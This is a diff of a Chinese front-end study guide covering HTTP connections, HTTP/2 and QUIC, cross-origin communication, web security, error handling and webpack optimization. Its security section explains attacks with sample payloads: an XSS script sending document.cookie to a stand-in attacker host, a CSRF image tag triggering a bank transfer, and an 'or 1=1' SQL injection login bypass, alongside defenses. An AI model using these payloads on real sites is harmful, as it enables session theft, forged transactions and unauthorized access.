@@ -208,7 +208,11 @@ Server：服务器的一些相关信息
 #####4.3 长连接和短连接
 tcp/ip 层面的定义：
 
-> 长连接：个 tcp/ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包） > 短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接 > 在 http 中： > http1.0：默认使用的是短连接，也就是说，浏览器每进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接 > http1.1：默认使用的是长连接。使用长连接会有这一行 Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接
+> 长连接：个 tcp/ip 连接上可以连续发送多个数据包，在 tcp 连接保持期间，如果没有数据包发送，需要双方发检测包以维持此连接，一般需要自己做在线维持（类似于心跳包）
+> 短连接：通信双方有数据交互时，就建立一个 tcp 连接，数据发送完成后，则断开此 tcp 连接
+> 在 http 中：
+> http1.0：默认使用的是短连接，也就是说，浏览器每进行一次 http 操作，就建立一次连接，任务结束就中断连接，譬如每一个静态资源请求时都是一个单独的连接
+> http1.1：默认使用的是长连接。使用长连接会有这一行 Connection: keep-alive，在长连接的情况下，当一个网页打开完成后，客户端和服务端之间用于传输 http 的 tcp 连接不会关闭，如果客户端再次访问这个服务器的页面，会继续使用这一条已经建立的连接
 
 #####4.4 http2.0
 
@@ -223,6 +227,9 @@ tcp/ip 层面的定义：
     > 1.1 中，请求一个资源，都是需要开启一个 tcp/ip 连接的，所以对应的结果是，每一个资源对应一个 tcp/ip 请求，由于 tcp/ip 本身有并发数限制，所以当资源一多，速度就显著慢下来
     > 2.0 中，一个 tcp/ip 请求可以请求多个资源，也就是说，只要一次 tcp/ip 请求，就可以请求若干个资源，分割成更小的帧请求，速度明显提升。
 
+>2.0因为一个tcp/ip可以传递多个资源，此时如果出现网络情况不好，出现丢包的情况下，整个 TCP 都要开始等待重传，也就导致了后⾯的所有数据都被阻塞了.但是对于 HTTP/1 来说，可以开启
+多个 TCP 连接，出现这种情况反到只会影响其中⼀个连接，剩余的TCP 连接还可以正常传输数据。
+>因为这个情况，google搞了⼀个基于 UDP 协议的QUIC 协议,并且使⽤在了 HTTP/3 上，当然 HTTP/3 之前名为HTTP-over-QUIC.
 #####4.5 https
 https 就是安全版本的 http，譬如一些支付等操作基本都是基于 https 的，因为 http 请求的安全系数太低了。
 
@@ -387,8 +394,11 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
     > 2.1 cookie localStorage 和 indexDB
     > 2.2 dom 无法获取
     > 2.3 ajax 请求
-    > #####8.2 不同源的网站通信问题
-    > 如果在 iframe 中,父窗口和子窗口不同源,可以采用以下方法进行通信
+
+#####8.2 不同源的网站通信问题
+
+> 如果在 iframe 中,父窗口和子窗口不同源,可以采用以下方法进行通信
+
 -   1 改变 iframe src 中的锚点.子窗口监听 hash 值的改变,获取对应的信息
 
     ```
@@ -404,11 +414,9 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
 
 -   2 使用 window.name 属性
     > 这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。
--   3 使用 otherWindow.postMessage
-    > h5 为了解决跨域通信的问题,引入了 postMessage API.此 api 的详细信息参考[postmessage](js/postMessage1.html)
-    -   通过 postMessage,可以读取其他窗口的 localStorage 信息
-        #####8.3 不同源的网站 ajax 通信
-        因为同源政策限制,ajax 请求不能发送给不同源的网站.为此有以下几种方法解决
+-   3 使用 otherWindow.postMessage > h5 为了解决跨域通信的问题,引入了 postMessage API.此 api 的详细信息参考[postmessage](js/postMessage1.html) - 通过 postMessage,可以读取其他窗口的 localStorage 信息
+    #####8.3 不同源的网站 ajax 通信
+    因为同源政策限制,ajax 请求不能发送给不同源的网站.为此有以下几种方法解决
 -   1 JSONP
     > 该方法利用 script 标签可以请求不同源的文件.然后在 src 属性上传递回调参数.这样请求回来的文件解析时就会触发相应的回调函数
 -   2 websocket
@@ -512,8 +520,7 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
 
 常见的 web 安全问题：1 csrf（跨站请求伪造）2 xss（跨站脚本注入）3 sql 注入
 
-#####9.1 **CSRF（跨站请求伪造）**
-    > 特征：**冒用用户身份，进行恶意操作**，前提是用户已经登录了账号，没有退出，然后访问危险网站。
+#####9.1 **CSRF（跨站请求伪造）** > 特征：**冒用用户身份，进行恶意操作**，前提是用户已经登录了账号，没有退出，然后访问危险网站。
 
 ![CSRF](https://segmentfault.com/img/remote/1460000012693783?w=904&h=739)
 
@@ -529,9 +536,7 @@ http 缓存分为强缓存（200 from cache）和协商缓存(304)
 -   1 验证 http 的 Referer 字段，但是完全依赖浏览器发送正确的 referer,也不是很可靠。因为完全依靠浏览器的具体实现，存在浏览器被破解的篡改其 referer 字段的可能
 -   2 在请求参数中加入 token 验证，比如 post 中，以参数的形式加个随机产生的 token
 
-#####9.2  **XSS（跨域脚本注入）**
-    > 特征:击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击
-
+#####9.2 **XSS（跨域脚本注入）** > 特征:击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击
 
 2.1 **cookie 劫持** _攻击者获取到用户的 cookie_
 
@@ -555,66 +560,122 @@ script>window.open("http://www.attackpage.com/record?secret=" + document.cookie)
 由于没有过滤脚本，**那么其它用户登陆后，在看到这篇文章时就会自动将他们的 cookie 信息都发送到了攻击者的服务器。攻击者可以在 cookie（譬如 jsessionid 对应的 session）有效期内拿它们冒充用户操作。**
 _这里是拿到了 cookie 后主动冒充用户的，而 CSRF 中根本就不知 cookie，仅利用浏览器的隐式校验方式冒充用户。_
 
-2.2 回话伪造。XSS形成的CSRF
->同样是评论漏洞的示例。攻击者输入（举例比喻）
+2.2 回话伪造。XSS 形成的 CSRF
+
+> 同样是评论漏洞的示例。攻击者输入（举例比喻）
+
 ```
 <img src=http://www.bank.example/transfer?toBankId=hello&amount=1000000 width='0' height='0'>
 ```
->然后接下来发生的事情和CSRF中提到的一致。
 
-**这里也没有拿到网站的cookie，而是借助浏览器的隐式校验机制来冒充客户**
+> 然后接下来发生的事情和 CSRF 中提到的一致。
+
+**这里也没有拿到网站的 cookie，而是借助浏览器的隐式校验机制来冒充客户**
 
 2.3 **其他恶意代码执行**
->专指前端的流氓JS，譬如前面的输入可以是：
->1 游戏弹窗
->2 无限循环的代码
->3 让页面直接卡死
+
+> 专指前端的流氓 JS，譬如前面的输入可以是：
+> 1 游戏弹窗
+> 2 无限循环的代码
+> 3 让页面直接卡死
 
 还有**富文本攻击**，在富文本中注入了脚本，前后端未过滤，导致直接输入到了页面上。
 **结论：**
-**只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。**
+**只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS 攻击都有可能发生。**
 
-防御XSS的手段：
-- 1 输入过滤。不信任用户的输入，过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符。或者过滤script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，还要考虑攻击者使用十六进制编码来输入脚本的方式。
-- 2 输出进行编码。和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了
-- 3 cookie设置http-only，这样用脚本就无法获取cookie了，避免脚本使用document.cookie获取网站的cookie
-- 4 cookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等
-- 5 后台不能信任前端的输入，一定要进行过滤
+防御 XSS 的手段：
 
-#####9.3 SQL注入
->如果后台没有过滤前端的输入数据,那么就可能形成SQL注入
+-   1 输入过滤。不信任用户的输入，过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符。或者过滤 script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，还要考虑攻击者使用十六进制编码来输入脚本的方式。
+-   2 输出进行编码。和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过 HtmlEncoder 等工具编码，这样就不会存在直接输出可执行的脚本了
+-   3 cookie 设置 http-only，这样用脚本就无法获取 cookie 了，避免脚本使用 document.cookie 获取网站的 cookie
+-   4 cookie 防盗，尽可能地避免在 Cookie 中泄露隐私，如用户名、密码等
+-   5 后台不能信任前端的输入，一定要进行过滤
 
-假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）
+#####9.3 SQL 注入
+
+> 如果后台没有过滤前端的输入数据,那么就可能形成 SQL 注入
+
+假设页面 A 中有一个登陆查询存在拙劣的 sql 注入漏洞，这样子的：（最极端，最傻的情况）
+
 ```
 <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
-<form action="login.jsp" method="post"> 
-     请输入用户名与密码：<BR> 
-     <input name="name" type="text"> 
-     <input name="password" type="text"> 
+<form action="login.jsp" method="post">
+     请输入用户名与密码：<BR>
+     <input name="name" type="text">
+     <input name="password" type="text">
      <input type="submit" value="登陆">
-</form> 
+</form>
 ```
+
 在接收到登陆请求后，服务端的实际执行代码时是：
+
 ```
 String sql = "SELECT * FROM users WHERE name = '" + name + "' AND password = '" + password + "'";
 ```
-然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入
+
+然而有攻击者分析出后台可能存在漏洞，尝试 sql 注入攻击，输入
+
 ```
 name = ''
 password = ''  or 1=1
 ```
+
 那么这样，后台接收到数据后，实际上查询的结果是
+
 ```
 SELECT * FROM users WHERE name = '''' AND password = '''' or 1=1
 ```
+
 故而，攻击者成功的绕过的用户名，利用后台漏洞登陆了。
 
-
 #### 10 错误处理机制
+
+##### 10.1 js 脚本运行出现的错误
+
+-   1 try-catch
+-   2 window.error
+-   3 跨域脚本出现的错误会显示 Script error,给 script 标签添加 crossorigin 属性
+
+##### 10.2 资源加载出现的错误
+
+-   1 图片加载因为某些原因加载不出来时，使用 obj.onerror
+-   2 window.error
 
 #### 11 viewport 移动端相关知识
 
 #### 12 性能优化
+
+##### 1 常用优化手段
+
+-   1 开启缓存
+    > 强缓存 expires cache-control：Max-age
+    > 弱缓存 last-modified e-tag
+-   2 CDN 静态加速
+-   3 减少|合并 http 请求，雪碧图
+-   4 非核心资源动态，或者非可视区域懒加载
+-   5 DNS 预解析 &lt;link rel="dns-prefetch" href="//yuchengkai.cn"&gt;
+-   6 预加载 &lt;link rel="preload" href="http://example.com"&gt;
+-   7 预渲染 &lt;link rel="prerender" href="http://example.com"&gt;
+-   8 使用 CDN 后，要考虑多域名.不然总会带上不需要的 cookie
+
+##### 2 js 优化
+
+-   1 非可视区域懒加载，例如图片懒加载
+-   2 分时加载 timethunk 函数，节流，防抖
+#####3 webpack 优化
+**1 bundle 包优化**
+-   1 异步加载，常用的例如路由异步加载，import()语法
+-   2 提取公共资源
+-   3 tree-shaking 删除项目中未引用的代码
+
+**2 构建优化**
+
+> 缩小 loader 解析范围，extensions配置越短越好
+> 从两步着手，loader 解析和 js 压缩。
+
+-   1 loader 解析 缩小 loader 解析范围，多用 resolve 中的 alias.loader 解析时固定范围，排除不需要解析的文件；使用 happyLoader,多进程解析
+-   2 DllPlugin,提前打包公共且不太可变的库,配置单独的 webpack-dll-conf.js
+-   3 代码压缩，使用多进程压缩parallel-uglify-plugin
 
 #### 13 mpvue
 
